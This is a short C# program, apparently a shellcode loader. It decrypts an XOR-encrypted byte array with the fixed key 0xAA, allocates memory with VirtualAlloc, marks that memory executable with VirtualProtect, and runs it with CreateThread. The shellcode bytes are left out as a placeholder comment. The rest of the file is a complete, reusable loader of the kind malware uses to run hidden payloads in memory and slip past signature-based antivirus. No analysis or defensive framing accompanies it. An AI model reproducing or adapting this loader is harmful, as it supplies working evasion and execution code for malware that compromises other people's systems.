using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Main(string[] args)
    {
        // Encrypted shellcode (encrypted using XOR as an example)

        byte[] encryptedShellcode = new byte[510] { /* ... Encrypted shellcode data ... */  };

        byte[] buf = DecryptShellcode(encryptedShellcode);

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000 /* MEM_COMMIT */, 0x04 /* PAGE_READWRITE */);

        Marshal.Copy(buf, 0, addr, buf.Length);

        uint oldProtect;
        VirtualProtect(addr, (uint)buf.Length, 0x20 /* PAGE_EXECUTE */, out oldProtect);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode)
    {
        byte key = 0xAA; 
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ key);
        }
        return decryptedShellcode;
    }
}
